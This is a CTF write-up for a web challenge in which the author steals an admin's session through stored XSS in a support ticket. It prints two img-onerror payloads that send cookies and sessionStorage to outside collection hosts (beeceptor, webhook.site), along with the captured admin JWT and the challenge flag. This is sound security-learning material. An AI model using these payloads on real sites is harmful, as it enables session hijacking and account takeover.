# The Ticketsystem 

## Description

Level: 3 Score 40 Category web

Our IT department has released a new web based support system. Every user can now create a ticket if she/he needs help. Is that awesome?! And the admins have promised to check every ticket super fast. So don't forget: everybody trust the admin! And the admin trust you! Is that a mistake in the end? Please login with username 'ticket' and password '!H3LP-CNTR90' to create a ticket. Please note: the ticket-system is recreating every hour.

**Link:** [https://ctf.securityvalley.org/tfe](https://ctf.securityvalley.org/tfe)

## Analysis

We are given a simple form which allows users to submit tickets,  after submittion the admin will check the ticket. 

![the-ticketsystem-1](/assets/ctf/securityvalley/the-ticketsystem-1.png)

The attack vector is possibly to steal the admin cookie. The user doesn't have cookie, but could be that admin has.

I used Cookie Stealer XSS from [WebHacking101](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md):
```html
<img src=x  onerror="this.src='https://klgrthio.free.beeceptor.com/?'+document.cookie; this.removeAttribute('onerror');">
```

![the-ticketsystem-2](/assets/ctf/securityvalley/the-ticketsystem-2.png)

No luck there. 

It seems like session storage is being used, second attack vector would be Session Hijacking. If we get the admin token, we can essentially log in as admin. `access_token` seems to JWT token, if we had a secret key we could forge different key, but since we don't have it we will steal.

![the-ticketsystem-3](/assets/ctf/securityvalley/the-ticketsystem-3.png)

Tweak the payload a bit:<br>
(Beeceptor wasn't working for some reason, so I switched to <https://webhook.site>)

```html
<img  src=x  onerror="this.src='https://webhook.site/<YourID>/?session='+btoa(JSON.stringify(sessionStorage)); this.removeAttribute('onerror');">
```

```
https://webhook.site/<YourID>/?session=eyJhY2Nlc3NfdG9rZW4iOiJleUpoYkdjaU9pSklVelV4TWlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKeWIyeGxJam9pWVdSdGFXNGlMQ0pwYzNNaU9pSmpkR1l0Wkd4aFlpSXNJbUYxWkNJNld5SmpkR1l0Wkd4aFlpNWpiMjBpWFN3aVpYaHdJam94TmpnNU1UY3pNakV4ZlEuN1ZXWTBfd0E2MHo0M0Ftck5NOU0xUVJQaUxscW1vbFA3Z2RlX0wwRFNqdVlvZ1NGb2g0NTNlblFoQnlwa2RiMC13UFpDbFZuLWdJWU1zRUZpVVpDTHciLCJyb2xlIjoiYWRtaW4iLCJ0b2tlbl9kdXJhdGlvbiI6IjE2ODkxNzMyMTEifQ==
```

```json
{
    access_token: "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJjdGYtZGxhYiIsImF1ZCI6WyJjdGYtZGxhYi5jb20iXSwiZXhwIjoxNjg5MTczMjExfQ.7VWY0_wA60z43AmrNM9M1QRPiLlqmolP7gde_L0DSjuYogSFoh453enQhBypkdb0-wPZClVn-gIYMsEFiUZCLw",
    role: "admin",
    token_duration: "1689173211"
}
```

Hmm... I switched the values with admin values, but I see same UI, not much changed. There must be a URI which only admin can visit.

I tried searching for `ticket` (known URI) in the `main.9902a55d1e62a36b.js` (Can be accessed from "sources"). After some searching I found what seems to be routes. 

1. login -> To login 
2. ticket -> To create ticket
3. admin/:id -> View ticket (Accessible by admin)
4. Anything else -> Redirects to login (That's why `/ticket/TicketID` didn't work)

```js
        const N3 = [{
            path: "login",
            component: F3
        }, {
            path: "admin/:id",
            component: I3,
            canActivate: [Fg, oA]
        }, {
            path: "ticket",
            component: O3,
            canActivate: [Fg]
        }, {
            path: "**",
            redirectTo: "/login"
        }];
```

## Solution

1. Hijack admin session by using XSS.
2. Create a ticket
3. Visit `/admin/TicketID`: 

![the-ticketsystem-4](/assets/ctf/securityvalley/the-ticketsystem-4.png)
::: tip Flag
`SecVal{XSS_GOD_YOU_ARE!!!}`
:::